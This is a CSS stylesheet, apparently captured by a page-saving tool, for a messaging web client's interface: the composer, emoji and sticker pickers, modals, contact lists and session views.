.im_history_loading{width:35px;margin:0 auto;visibility:hidden}
.im_history_loading.vertical-aligned{visibility:visible}
.im_history_loading_more{display:block;width:26px;height:46px;margin:0 auto;padding:20px 0 0;visibility:hidden}
.im_history_loading_more .progress-arc-wrap{display:none}
.im_history_loading_more.im_history_loading_more_active{visibility:visible}
.im_history_loading_more.im_history_loading_more_active .progress-arc-wrap{display:block}
.im_history_loading_less{display:block;width:26px;margin:0 auto;visibility:hidden}
.im_history_loading_less .progress-arc-wrap{display:none}
.im_history_loading_less.im_history_loading_less_active{visibility:visible}
.im_history_loading_less.im_history_loading_less_active .progress-arc-wrap{display:block}
.im_send_panel_wrap{margin:0 auto;padding:10px 15px 30px}
.im_send_form_wrap{position:relative}
.im_send_form{margin:0 auto;position:absolute;bottom:0}
.im_attach_input,.im_media_attach_input{cursor:pointer;font-size:120px!important;opacity:.01;position:absolute;z-index:100;margin:0;padding:0;top:0;right:0}
.im_send_dropbox_wrap{background:#fff;display:none;padding:17px 10px 0;border:1px dashed #999;overflow:hidden;text-align:center;color:#999;position:absolute}
.im_send_form_dragging .im_send_dropbox_wrap{display:block}
.im_send_form_dragging .composer_command_btn,.im_send_form_dragging .composer_emoji_insert_btn,.im_send_form_dragging .composer_keyboard_btn,.im_send_form_dragging .composer_progress_icon_wrap,.im_send_form_dragging .composer_rich_textarea,.im_send_form_dragging .im_inline_placeholder_wrap,.im_send_form_dragging .im_message_field{visibility:hidden}
.im_send_field_wrap{position:relative}
textarea.im_message_field{font-size:12px;margin-bottom:10px;padding:6px;min-height:50px;height:50px;resize:none}
.im_inline_placeholder_wrap{color:#9aa2ab;position:absolute;margin-top:2px;white-space:nowrap;pointer-events:none;text-overflow:ellipsis;display:none;width:100%;width:calc(100% - 30px);overflow:hidden}
.im_inline_placeholder_wrap.active{display:block}
.im_inline_placeholder_prefix{visibility:hidden}
.icon-online{background:#6ec26d;border:1px solid #fff;display:block;width:11px;height:11px;border-radius:6px;overflow:hidden;position:absolute;margin-top:-7px;margin-left:33px}
.im_send_reply_wrap{margin-bottom:5px}
.im_send_reply_form_wrap a.im_panel_own_photo,.im_send_reply_form_wrap a.im_panel_peer_photo{margin-top:41px}
.im_send_reply_cancel{float:right;display:block;width:18px;height:18px;margin-right:6px;margin-top:5px;-webkit-transform:translate3d(0,0,0);padding-top:7px}
.im_send_reply_cancel .icon-reply-bar{display:block;background:#999;width:18px;height:2px;transform-origin:50% 50%}
.im_send_reply_cancel:hover .icon-reply-bar{background:#44a1e8}
.icon-reply-bar:first-child{-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-o-transform:rotate(-45deg);-ms-transform:rotate(-45deg);transform:rotate(-45deg);transform-origin:50% 50%}
.icon-reply-bar:last-child{-webkit-transform:translate3d(0,-2px,0) rotate(45deg);-moz-transform:translate3d(0,-2px,0) rotate(45deg);-o-transform:translate3d(0,-2px,0) rotate(45deg);-ms-transform:translate3d(0,-2px,0) rotate(45deg);transform:translate3d(0,-2px,0) rotate(45deg)}
.img_fullsize_wrap,a.img_fullsize{display:block;text-align:center}
img.img_fullsize{margin:0 auto}
.document_modal_image_wrap{overflow:auto}
.document_fullsize_wrap{display:none;cursor:zoom-in;text-align:center}
.document_fullsize_zoomed{cursor:zoom-out}
.document_fullsize_img{-webkit-user-select:none}
.document_fullsize_zoomed .document_fullsize_img{-webkit-user-select:none;image-rendering:optimizeSpeed;image-rendering:-moz-crisp-edges;image-rendering:-o-crisp-edges;image-rendering:-webkit-optimize-contrast;image-rendering:optimize-contrast;-ms-interpolation-mode:nearest-neighbor}
.video_full_player video{background:#000}
.media_modal_info{color:#999;margin:20px 0 0}
.media_modal_actions{margin-top:20px}
.media_modal_action_link{margin-left:15px}
.media_modal_author{color:inherit;font-weight:700}
.media_modal_author:hover{color:inherit}
.non_osx .media_modal_author{font-size:12px}
.composer_progress_enabled-add,.composer_progress_enabled-remove{transition-duration:.2s}
.composer_progress_icon_wrap{position:absolute;right:3px;top:2px;width:22px;height:22px;overflow:hidden;margin-top:1px;pointer-events:none;padding:0;display:none;opacity:0}
.composer_progress_enabled-add .composer_progress_icon_wrap,.composer_progress_enabled-remove .composer_progress_icon_wrap{transition:opacity cubic-bezier(.25,.46,.45,.94) .2s;display:block}
.composer_progress_enabled .composer_progress_icon_wrap{display:block;opacity:1}
.composer_emoji_insert_btn{position:absolute;right:3px;top:2px;cursor:pointer;padding:0;width:22px;height:22px;margin-top:1px;display:block;opacity:1}
.composer_progress_enabled .composer_emoji_insert_btn{display:none;opacity:0}
.composer_progress_enabled-add .composer_emoji_insert_btn,.composer_progress_enabled-remove .composer_emoji_insert_btn{transition:opacity cubic-bezier(.25,.46,.45,.94) .2s;display:block}
.icon-emoji{display:inline-block;width:22px;height:22px;vertical-align:top;opacity:.8;background-image:/*savepage-url=../img/icons/General.png*/var(--savepage-url-3);background-repeat:no-repeat;background-position:-9px -335px}
.is_2x .icon-emoji{background-image:/*savepage-url=../img/icons/General_2x.png*/url();background-size:40px 948px}
.composer_emoji_tooltip{display:none;position:absolute;z-index:999;width:286px;margin-left:-133px;margin-top:-330px;border:1px solid #dfdfdf;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px;-webkit-box-shadow:0 1px 1px rgba(0,0,0,.1);-moz-box-shadow:0 1px 1px rgba(0,0,0,.1);box-shadow:0 1px 1px rgba(0,0,0,.1);background:#fff;padding:0}
.composer_emoji_tooltip_shown{display:block}
.composer_emoji_tooltip_tail{position:absolute;bottom:-14px;left:50%;margin-left:-13px;overflow:hidden;width:26px;height:14px}
.icon-tooltip-tail{background:#fff;width:18px;height:18px;display:inline-block;border:1px solid #dfdfdf;border-width:0 1px 1px 0;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;position:relative;top:-8px;left:4px;-webkit-transform:rotate(45deg);-moz-transform:rotate(45deg);-o-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg);-webkit-box-shadow:1px 1px 1px rgba(0,0,0,.1);-moz-box-shadow:1px 1px 1px rgba(0,0,0,.1);box-shadow:1px 1px 1px rgba(0,0,0,.1)}
.composer_emoji_tooltip_tabs{-webkit-box-shadow:0 1px 0 0 rgba(0,0,0,.1);-moz-box-shadow:0 1px 0 0 rgba(0,0,0,.1);box-shadow:0 1px 0 0 rgba(0,0,0,.1);padding-top:2px}
.composer_emoji_tooltip_tab{cursor:pointer;display:inline-block;line-height:33px;text-align:center;width:50%;text-transform:uppercase;font-weight:700;transition:color ease-in-out .2s}
.composer_emoji_tooltip_tab:active,.composer_emoji_tooltip_tab:focus,.composer_emoji_tooltip_tab:hover{text-decoration:none}
.composer_emoji_tooltip_tab_emoji,.composer_emoji_tooltip_tabs_stickers_active .composer_emoji_tooltip_tab_stickers{color:#53a9ea}
.composer_emoji_tooltip_tab_stickers,.composer_emoji_tooltip_tabs_stickers_active .composer_emoji_tooltip_tab_emoji{color:#999}
.composer_emoji_tooltip_tab_shadow{width:50%;height:1px;background:#53a9ea;-webkit-box-shadow:0 1px 0 0 #53a9ea;-moz-box-shadow:0 1px 0 0 #53a9ea;box-shadow:0 1px 0 0 #53a9ea;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-o-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);transform:translate3d(0,0,0);transition:transform ease-in-out .2s}
.composer_emoji_tooltip_tabs_stickers_active .composer_emoji_tooltip_tab_shadow{-webkit-transform:translate3d(100%,0,0);-moz-transform:translate3d(100%,0,0);-o-transform:translate3d(100%,0,0);-ms-transform:translate3d(100%,0,0);transform:translate3d(100%,0,0)}
.composer_emoji_tooltip_categories{width:100%;line-height:0}
.composer_emoji_tooltip_tab_emoji_content .composer_emoji_tooltip_categories{width:100%;margin:0 0 3px;padding:0 5px 15px;line-height:0}
.composer_emoji_tooltip_tab_stickers_content .composer_emoji_tooltip_categories{vertical-align:top;padding:0 5px 15px;margin:0 0 3px;overflow-x:scroll;white-space:nowrap;position:relative}
.composer_emoji_tooltip_tab_stickers_content .composer_emoji_tooltip_categories::-webkit-scrollbar{display:none}
.composer_emoji_tooltip_tab_stickers_content .composer_emoji_tooltip_categories .composer_sticker_btn{width:36px;height:34px;padding:3px 4px;vertical-align:top;margin:4px 0 0}
.composer_emoji_tooltip_tab_stickers_content .composer_emoji_tooltip_categories .composer_sticker_image{max-width:28px;max-height:28px}
.composer_emoji_tooltip_category{line-height:0;color:#fff;display:inline-block;cursor:pointer;opacity:.3;padding:9px 12px}
.composer_emoji_tooltip_category:hover{opacity:.4}
.composer_emoji_tooltip_category.active,.composer_emoji_tooltip_category.active:hover{opacity:1}
.composer_emoji_tooltip_category i{display:inline-block;width:21px;height:21px;background-image:/*savepage-url=../img/icons/IconsetSmiles.png*/url();background-repeat:no-repeat}
.is_2x .composer_emoji_tooltip_category i{background-image:/*savepage-url=../img/icons/IconsetSmiles_2x.png*/url();background-size:27px 362px}
.composer_emoji_tooltip_category_recent{background-position:-3px 0}
.active .composer_emoji_tooltip_category_recent{background-position:-3px -31px}
.composer_emoji_tooltip_category_smile{background-position:-3px -62px}
.active .composer_emoji_tooltip_category_smile{background-position:-3px -93px}
.composer_emoji_tooltip_category_flower{background-position:-3px -124px}
.active .composer_emoji_tooltip_category_flower{background-position:-3px -155px}
.composer_emoji_tooltip_category_bell{background-position:-3px -185px}
.active .composer_emoji_tooltip_category_bell{background-position:-3px -213px}
.composer_emoji_tooltip_category_car{background-position:-3px -241px}
.active .composer_emoji_tooltip_category_car{background-position:-3px -269px}
.composer_emoji_tooltip_category_grid{background-position:-3px -297px}
.active .composer_emoji_tooltip_category_grid{background-position:-3px -324px}
.composer_emoji_tooltip_tabs_wrap{height:275px;width:284px;position:relative;overflow:hidden}
.composer_emoji_tooltip_tabs_contents{position:absolute;width:568px}
.non_msie .composer_emoji_tooltip_tabs_contents{transition:transform ease-in-out .2s;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-o-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}
.non_msie .composer_emoji_tooltip_tabs_stickers_active .composer_emoji_tooltip_tabs_contents{-webkit-transform:translate3d(-284px,0,0);-moz-transform:translate3d(-284px,0,0);-o-transform:translate3d(-284px,0,0);-ms-transform:translate3d(-284px,0,0);transform:translate3d(-284px,0,0)}
.msie .composer_emoji_tooltip_tabs_contents{margin-left:0;transition:margin-left ease-in-out .2s}
.msie .composer_emoji_tooltip_tabs_stickers_active .composer_emoji_tooltip_tabs_contents{margin-left:-284px}
.composer_emoji_tooltip_tab_emoji_content,.composer_emoji_tooltip_tab_stickers_content{width:284px;height:275px;float:left}
.composer_emoji_tooltip_content_stickers{position:relative}
.composer_emoji_tooltip_content_wrap{padding:0 2px 0 8px}
.composer_emoji_tooltip .scroller_scrollable_container{height:233px;position:relative}
.composer_emoji_tooltip_content{padding-top:10px;padding-right:8px;outline:0!important}
a.composer_emoji_btn{margin:0 2px 0 0;padding:5px;display:block;float:left;border-radius:2px}
a.composer_emoji_btn:hover{background-color:#edf2f5}
.emoji{-moz-box-orient:vertical;display:inline-block;vertical-align:baseline;height:18px;width:18px;background-repeat:no-repeat;text-indent:-9999px;border:0}
.emoji-spritesheet-0{background-size:486px 126px;background-image:/*savepage-url=../img/emojisprite_0.png*/url()}
.emoji-spritesheet-1{background-size:522px 72px;background-image:/*savepage-url=../img/emojisprite_1.png*/url()}
.emoji-spritesheet-2{background-size:594px 126px;background-image:/*savepage-url=../img/emojisprite_2.png*/url()}
.emoji-spritesheet-3{background-size:612px 54px;background-image:/*savepage-url=../img/emojisprite_3.png*/url()}
.emoji-spritesheet-4{background-size:612px 126px;background-image:/*savepage-url=../img/emojisprite_4.png*/url()}
.emoji-w20{width:20px;height:20px;vertical-align:middle;display:inline-block}
.emoji-w20.emoji-spritesheet-0{background-size:540px 140px}
.emoji-w20.emoji-spritesheet-1{background-size:580px 80px}
.emoji-w20.emoji-spritesheet-2{background-size:660px 140px}
.emoji-w20.emoji-spritesheet-3{background-size:680px 60px}
.emoji-w20.emoji-spritesheet-4{background-size:680px 140px}
.emoji-w26{width:26px;height:26px;vertical-align:middle;display:inline-block}
.emoji-w26.emoji-spritesheet-0{background-size:702px 182px}
.emoji-w26.emoji-spritesheet-1{background-size:754px 104px}
.emoji-w26.emoji-spritesheet-2{background-size:858px 182px}
.emoji-w26.emoji-spritesheet-3{background-size:884px 78px}
.emoji-w26.emoji-spritesheet-4{background-size:884px 182px}
.composer_dropdown_wrap{background:#FFF;display:none;position:absolute;z-index:10;border:0;-webkit-box-shadow:0 1px 1px 0 rgba(60,75,87,.27);-moz-box-shadow:0 1px 1px 0 rgba(60,75,87,.27);box-shadow:0 1px 1px 0 rgba(60,75,87,.27);border-radius:0;margin-top:-5px;margin-left:-1px;width:380px}
.composer_dropdown{position:static;display:block;float:none;top:auto;left:auto;border:0;border-radius:0;padding:0;margin:0;z-index:auto}
.composer_dropdown>li>a{display:block;font-size:13px;line-height:15px;padding:4px 10px;color:#52719a}
.composer_dropdown li a:hover,.composer_dropdown li.composer_autocomplete_option_active a{color:#52719a;background:#f2f6fa;text-decoration:none}
.composer_emoji_shortcut{display:inline-block;vertical-align:top;margin-left:15px;line-height:20px}
.composer_mention_option{line-height:20px}
.composer_user_mention{color:grey;margin-left:7px}
.composer_dropdown li a:hover .composer_user_mention,.composer_dropdown li.composer_autocomplete_option_active a .composer_user_mention{color:#698192}
span.composer_user_photo{display:inline-block;width:32px;height:32px;border-radius:50%;overflow:hidden;margin-right:10px;vertical-align:top}
img.composer_user_photo{width:32px;height:32px;vertical-align:top}
span.composer_user_photo .peer_initials{line-height:32px;font-size:14px}
.composer_user_mention,.composer_user_name{display:inline-block;line-height:32px;vertical-align:top}
.composer_dropdown a.composer_command_option{color:grey;line-height:32px;padding-right:5px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
.composer_dropdown .composer_command_value{color:#52719a;display:inline}
.composer_dropdown .composer_command_desc{display:inline;color:grey;padding-left:7px;font-weight:400;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
.composer_autocomplete_option_active a.composer_command_option .composer_command_desc,a.composer_command_option:hover .composer_command_desc{color:#698192}
.composer_command_desc .emoji{vertical-align:text-bottom}
.composer_stickerset_title{display:block;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;font-weight:700;font-size:13px;color:#444;margin:10px 0 3px;padding:0 6px}
.composer_stickerset_wrap:first-child .composer_stickerset_title{margin-top:0}
.composer_stickerset_title:hover{color:#444}
.composer_sticker_btn{width:66px;height:66px;display:inline-block;text-align:center;padding:3px;vertical-align:top}
.composer_sticker_btn:hover{background:#f2f6fa}
.composer_sticker_image{max-width:60px;max-height:60px;vertical-align:middle}
.composer_rich_textarea{font-size:12px;margin-bottom:10px;padding:6px;min-height:38px;height:auto;width:auto;max-height:284px;overflow:auto;line-height:17px;border:1px solid #d2dbe3;border-radius:2px;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;-ms-box-sizing:content-box;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box;-webkit-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;word-wrap:break-word;-webkit-user-select:text;-moz-user-select:text;-ms-user-select:text;user-select:text}
.composer_rich_textarea:empty::before{content:attr(placeholder);color:#9aa2ab;display:block;margin-top:-1px;margin-left:1px;pointer-events:none}
.composer_rich_textarea:empty:active::before,.composer_rich_textarea:empty:focus::before{opacity:.75}
.composer_rich_textarea img{width:20px;height:20px;vertical-align:middle;margin:-3px 0 0}
@-moz-document url-prefix(){.composer_rich_textarea:empty:active:before,.composer_rich_textarea:empty:focus:before{display:none}}
.composer_rich_textarea:empty:active:before,_:-ms-lang(x){display:none}
.composer_rich_textarea:empty:focus:before,_:-ms-lang(x){display:none}
.composer_command_btn{display:block;position:absolute;right:37px;top:4px;cursor:pointer;padding:0;width:20px;height:20px}
.icon-slash{display:inline-block;width:20px;height:20px;vertical-align:top;opacity:.8;background-image:/*savepage-url=../img/icons/General.png*/var(--savepage-url-3);background-repeat:no-repeat;background-position:-10px -790px}
.is_2x .icon-slash{background-image:/*savepage-url=../img/icons/General_2x.png*/url();background-size:40px 948px}
.composer_command_btn.active .icon-slash{background-position:-10px -820px}
.composer_command_btn:hover .icon-slash{opacity:1}
.composer_keyboard_btn{display:block;position:absolute;right:37px;top:4px;cursor:pointer;padding:0;width:20px;height:20px}
.icon-keyboard{display:inline-block;width:20px;height:20px;vertical-align:top;opacity:.8;background-image:/*savepage-url=../img/icons/General.png*/var(--savepage-url-3);background-repeat:no-repeat;background-position:-10px -730px}
.is_2x .icon-keyboard{background-image:/*savepage-url=../img/icons/General_2x.png*/url();background-size:40px 948px}
.composer_keyboard_btn.active .icon-keyboard{background-position:-10px -760px}
.composer_keyboard_btn:hover .icon-keyboard{opacity:1}
.inline_switch_pm{text-decoration:none!important;display:block;font-size:13px;font-weight:700;line-height:15px;padding:10px;text-align:center;color:#52719a}
.inline_switch_pm:hover{background:#f2f6fa;color:#52719a}
.inline_results_wrap{line-height:0}
.inline_result_wrap{display:block}
.inline_result_gif,.inline_result_photo,.inline_result_sticker{display:inline-block;padding:1px}
.inline_result_article{display:block}
.inline_article_thumb_wrap{width:50px;height:50px;margin-right:10px;text-align:center}
.inline_article_thumb{max-width:50px;max-height:50px;line-height:0}
.inline_result_video .inline_article_thumb_wrap{width:90px;height:50px}
.inline_result_video .inline_article_thumb{max-width:90px;max-height:50px}
.inline_article_thumb_initials{color:#999;background:#EEE;line-height:50px;text-align:center;font-size:25px;text-transform:uppercase}
li a:hover .inline_article_thumb_initials,li.composer_autocomplete_option_active a .inline_article_thumb_initials{color:#698192;background:#e0e9f3}
.inline_article_content_wrap{overflow:hidden;pointer-events:none}
.inline_article_description,.inline_article_thumb_wrap,.inline_article_title,.inline_article_url{pointer-events:none}
.inline_article_title{color:#222;font-weight:700;font-size:12px}
.inline_article_description{color:grey;padding-top:4px;font-size:12px}
li a:hover .inline_article_description,li.composer_autocomplete_option_active a .inline_article_description{color:#698192}
.inline_article_url{padding-top:4px}
.composer_dropdown>li.inline_result_gif>a,.composer_dropdown>li.inline_result_photo>a,.composer_dropdown>li.inline_result_sticker>a{padding:0;line-height:0;display:block;overflow:hidden}
li.inline_result_gif.composer_autocomplete_option_active a,li.inline_result_photo.composer_autocomplete_option_active a,li.inline_result_sticker.composer_autocomplete_option_active a{position:relative}
li.inline_result_gif.composer_autocomplete_option_active a .inline_result_ind,li.inline_result_photo.composer_autocomplete_option_active a .inline_result_ind,li.inline_result_sticker.composer_autocomplete_option_active a .inline_result_ind{display:block;background:rgba(255,255,255,.3);width:100%;height:100%;position:absolute}
.inline_result_gif .img_gif_video,.inline_result_photo .inline_result_photo_image{object-fit:cover}
.inline_result_sticker img{object-fit:contain}
.inline_result_game img{object-fit:cover;width:50px;height:50px}
.inline_result_gif_http,.inline_result_gif_mtproto,.inline_result_photo_http,.inline_result_photo_mtproto{pointer-events:none}
.im_voice_recorder_wrap{display:none;z-index:100}
.im_recorder_indicator,.im_recorder_time{float:left;vertical-align:middle;color:#333}
.im_recorder_indicator i{background-color:#ff1010;height:10px;width:10px;border-radius:50%;margin-right:5px;vertical-align:baseline;display:inline-block;animation:blinker .5s cubic-bezier(.5,0,1,1) infinite alternate}
@keyframes blinker{from{opacity:1}
to{opacity:0}}
.im_recorder_label{overflow:auto;font-size:12px;text-align:center;vertical-align:middle;color:#3a6d99;transition:color linear .2s}
.im_recorder_label i{margin-right:5px}
.im_send_form_hover .im_recorder_label{color:#CCC}
.im_recorder_label_hover,.im_send_form_hover .im_recorder_label_hout{display:none}
.im_send_form_hover .im_recorder_label_hover{display:inline}
.im_processing_recording,.im_voice_recording{color:#AAA}
.im_processing_recording .im_voice_recorder_wrap,.im_voice_recording .im_voice_recorder_wrap{display:block}
.error_modal_description{color:#999;padding:5px 0;font-size:13px;line-height:160%}
.md_simple_modal_alert_body .error_modal_description,.md_simple_modal_alert_body .md_simple_header{text-align:center}
.error_modal_details textarea{display:block;font-family:Menlo,Monaco,Consolas,"Courier New",monospace;font-size:10px;line-height:100%;white-space:pre-wrap;padding:4px;margin:10px 0;word-break:break-all;word-wrap:break-word;color:#333;background-color:#f5f5f5;border:1px solid #ccc;border-radius:4px;width:100%;text-align:left}
.error_modal_details_link,.error_modal_details_link:hover{font-size:11px;color:#999}
.confirm_modal_description{text-align:center;padding:20px 0;font-size:14px;line-height:160%}
.confirm_phone_number{font-weight:700;padding:15px 10px 0;text-align:center}
.confirm_modal_extlink_jump{word-break:break-all}
.confirm_modal_paste_image{max-width:274px;height:274px;background-position:50% 50%;background-size:contain;background-repeat:no-repeat;margin:10px auto -10px}
.document_modal_window,.photo_modal_window,.video_modal_window{display:block}
.photo_modal_error{color:#999;position:absolute;width:100%;top:50%;margin-top:-20px;padding:0 20px;text-align:center;font-size:1.4em;line-height:160%}
.video_full_error{border-radius:10px;overflow:hidden;background:rgba(0,0,0,.6);color:#fff;position:absolute;top:50%;margin:-40px 10px 0;padding:10px;text-align:center;font-size:1.4em;line-height:160%}
.settings_modal_wrap .im_attach_input{z-index:999}
.settings_modal_username_link,.settings_modal_username_link:hover{color:inherit}
.settings_external_service{line-height:0;display:inline-block;padding:7px 9px}
.settings_about_section_body{padding-right:0}
.settings_about_section_body p{margin-top:7px;margin-bottom:3px}
.icon-github{display:inline-block;width:59px;height:18px;background-image:/*savepage-url=../img/icons/AboutLogos.png*/url();background-repeat:no-repeat;background-position:0 -5px}
.is_2x .icon-github{background-image:/*savepage-url=../img/icons/AboutLogos_2x.png*/url();background-size:60px 136px}
a:hover .icon-github{background-position:0 -43px}
.icon-twitter{display:inline-block;width:20px;height:15px;margin-top:1px;background-image:/*savepage-url=../img/icons/AboutLogos.png*/url();background-repeat:no-repeat;background-position:0 -81px}
.is_2x .icon-twitter{background-image:/*savepage-url=../img/icons/AboutLogos_2x.png*/url();background-size:60px 136px}
a:hover .icon-twitter{background-position:0 -116px}
.contacts_modal_search{position:relative;padding:7px 12px 6px;-webkit-box-shadow:0 1px 1px rgba(0,0,0,.15);-moz-box-shadow:0 1px 1px rgba(0,0,0,.15);box-shadow:0 1px 1px rgba(0,0,0,.15);z-index:1}
.contacts_modal_search_field{font-size:12px;line-height:normal;border:1px solid #fff!important;border-radius:2px;padding:6px 27px 6px 30px;margin:0;background-image:/*savepage-url=../img/icons/IconsetW.png*/url();background-repeat:no-repeat;background-position:-6px -205px}
.is_2x .contacts_modal_search_field{background-image:/*savepage-url=../img/icons/IconsetW_2x.png*/url();background-size:42px 1171px}
.contacts_modal_search_field::-ms-clear{display:none}
a.contacts_modal_search_clear{right:9px;margin-top:-24px}
.contacts_scrollable_wrap{outline:0!important}
.contacts_modal_contacts_empty{visibility:hidden;text-align:center;color:#999;font-size:16px;line-height:160%;padding:1px 50px;margin:0}
.contacts_modal_contacts_empty.vertical-aligned{visibility:visible}
.contacts_modal_members_list .contacts_modal_contact_wrap{margin-top:0}
.contacts_modal_members_list a.contacts_modal_contact{clear:both;overflow:hidden;color:#000;padding:8px 9px;border-radius:0}
.contacts_modal_members_list .active a.contacts_modal_contact,.contacts_modal_members_list .active a.contacts_modal_contact:hover,.contacts_modal_members_list a.contacts_modal_contact:hover{background:#f2f6fa}
.contacts_modal_contact_name{display:block;color:#3C6E97;font-weight:700;margin:1px 0 2px}
.non_osx .contacts_modal_contact_name{font-size:12px}
.contacts_modal_contact_photo{width:40px;height:40px;margin-right:10px;overflow:hidden;border-radius:20px}
.contacts_modal_contact_photo .peer_initials{line-height:40px;font-size:15px}
.contacts_modal_contact_status{color:#999}
.contacts_modal_members_list .active a.contacts_modal_contact .contacts_modal_contact_status,.contacts_modal_members_list .active a.contacts_modal_contact .md_modal_list_peer_description,a.contacts_modal_contact:hover .contacts_modal_contact_status,a.contacts_modal_contact:hover .md_modal_list_peer_description{color:#91a6ba}
h4.chat_modal_migrate_header{font-size:inherit;font-weight:700;color:inherit}
ul.chat_modal_migrate_list{margin-top:10px;padding-left:15px}
.chat_modal_participant_wrap{padding:8px 0;border-top:1px solid #F0F0F0}
.chat_modal_participant_wrap:first-child{border-top:0}
.chat_modal_participant_kick{padding:11px 0;display:block}
.chat_modal_participant_name{display:block;color:#3C6E97;font-weight:700;margin:1px 0 2px}
.non_osx .chat_modal_participant_name{font-size:12px}
.chat_modal_participant_status{color:#999}
a.chat_modal_participant_photo{width:40px;height:40px;margin-right:10px;border-radius:20px;overflow:hidden}
img.chat_modal_participant_photo{width:40px;height:40px}
.chat_modal_participant_photo .peer_initials{line-height:40px;font-size:15px}
.chat_modal_members_forbidden{color:#999}
.icon-contact-tick{position:absolute;right:10px;top:17px;display:inline-block;width:25px;height:25px;opacity:.5;background-image:/*savepage-url=../img/icons/IconsetW.png*/url();background-repeat:no-repeat;background-position:-9px -516px}
.is_2x .icon-contact-tick{background-image:/*savepage-url=../img/icons/IconsetW_2x.png*/url();background-size:42px 1171px}
.contacts_modal_members_list .contacts_modal_contact_wrap:hover .icon-contact-tick{background-position:-9px -481px;opacity:.5}
.contacts_modal_members_list .contacts_modal_contact_wrap.active .icon-contact-tick{background-position:-9px -481px;opacity:1}
.contacts_modal_members_list .disabled{pointer-events:none}
.contacts_modal_members_list .disabled .icon-contact-tick{display:none}
.sessions_modal_session{padding:8px 24px}
.sessions_modal_sessions_header{color:#999;font-size:13px;margin-left:16px;margin-top:20px;font-weight:700}
.sessions_modal_terminate_all_wrap{margin:5px 0 0 24px}
.sessions_modal_sessions_list{padding:14px 0 10px;margin-bottom:10px}
.session_active_date_online{color:#3a6d99}
.sessions_modal_loading{text-align:center;color:#999;font-size:16px;line-height:18px;padding:1px 50px;margin:0}
.session_active_date{color:#999}
.session_meta_wrap{text-align:right}
.session_terminate_btn{margin-top:24px;display:inline-block}
.sessions_modal_session_app{font-weight:700;font-style:12px;margin-bottom:3px}
.sessions_modal_session_device{margin:3px 0}
.sessions_modal_session_location{color:#777}
.sessions_modal_other_splitter{margin:15px 0 20px 24px}
.stickerset_modal_window .modal-dialog{max-width:642px;width:auto}
.stickerset_modal_stickers_list{padding:25px}
.stickerset_modal_sticker_wrap{margin:0 5px 5px 0;padding:0;position:relative;display:block;width:192px;height:192px;float:left;border-radius:3px;overflow:hidden}
.stickerset_modal_sticker_wrap:hover{background:#f2f6fa}
.stickerset_modal_sticker{width:192px;height:192px;text-align:center}
.stickerset_modal_sticker img{max-width:192px;max-height:192px}
.stickerset_modal_sticker_alt{position:absolute;bottom:0;right:0}
.stickerset_actions{padding:10px 20px;height:50px;text-align:center}
.stickerset_modal_loading{text-align:center;color:#999;font-size:16px;line-height:18px;padding:1px 50px;margin:0}
.modal-dialog{width:100%}
.confirm_modal_window .modal-dialog,.error_modal_window .modal-dialog,.md_simple_modal_window .modal-dialog{max-width:348px}
.im_message_focus_active .audio_player_duration,.im_message_focus_active .audio_player_size,.im_message_focus_active .im_message_author_admin,.im_message_focus_active .im_message_date,.im_message_focus_active .im_message_document_size,.im_message_focus_active .im_message_edited,.im_message_focus_active .im_message_fwd_date,.im_message_focus_active .im_message_sign_link,.im_message_focus_active .im_message_views_cnt{color:#899daf}
.im_message_focus_active .im_message_outer_wrap{background-color:rgba(242,246,250,0);animation-name:im_message_focus_fade;-webkit-animation-timing-function:ease-in;animation-timing-function:ease-out;animation-duration:4s}
@keyframes im_message_focus_fade{from{background-color:#f2f6fa}
to{background-color:rgba(242,246,250,0)}}
.user_color_1,.user_color_1:hover{color:#8365ab}
.user_color_2,.user_color_2:hover{color:#539e4f}
.user_color_3,.user_color_3:hover{color:#ae9661}
.user_color_4,.user_color_4:hover{color:#4979a3}
.user_color_5,.user_color_5:hover{color:#b7635d}
.user_color_6,.user_color_6:hover{color:#b3577a}
.user_color_7,.user_color_7:hover{color:#5397b4}
.user_color_8,.user_color_8:hover{color:#c07844}
.user_bgcolor_1{background:#cc90e2}
.user_bgcolor_2{background:#80d066}
.user_bgcolor_3{background:#ecd074}
.user_bgcolor_4{background:#6fb1e4}
.user_bgcolor_5{background:#e57979}
.user_bgcolor_6{background:#f98bae}
.user_bgcolor_7{background:#73cdd0}
.user_bgcolor_8{background:#fba76f}
a.peer_photo_init:active,a.peer_photo_init:focus,a.peer_photo_init:hover{text-decoration:none}
.peer_initials{display:block;color:#fff;text-align:center;text-transform:uppercase;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
.im_dialogs_contacts_wrap h5,.im_dialogs_messages_wrap h5{color:#999;font-size:13px;margin-left:20px;font-weight:700}
.img_gif_image_wrap{position:relative;overflow:hidden}
.img_gif_meta{background:rgba(0,0,0,.4);width:40px;height:40px;line-height:0;position:absolute;z-index:2;border-radius:50%;overflow:hidden;margin:-20px auto 0 -20px;top:50%;left:50%;pointer-events:none}
.img_gif_label{font-weight:700;color:#FFF;display:block;line-height:40px;font-size:13px;text-align:center}
.img_gif_thumb{-webkit-filter:blur(2px);-moz-filter:blur(2px);-o-filter:blur(2px);-ms-filter:blur(2px);filter:blur(2px);filter:progid:DXImageTransform.Microsoft.Blur(PixelRadius='3');transform-origin:center center;-webkit-transform-origin:center center;-webkit-transform:scale(1.02,1.02);transform:scale(1.02,1.02);max-width:100%;height:auto}
.img_gif_meta_contents{transition:all cubic-bezier(.25,.46,.45,.94) .2s}
.img_gif_meta_contents.ng-enter,.img_gif_meta_contents.ng-leave.ng-leave-active{opacity:0}
.img_gif_meta_contents.ng-enter.ng-enter-active,.img_gif_meta_contents.ng-leave{opacity:1}
.img_round_with_progress_wrap{display:inline-block;line-height:0}
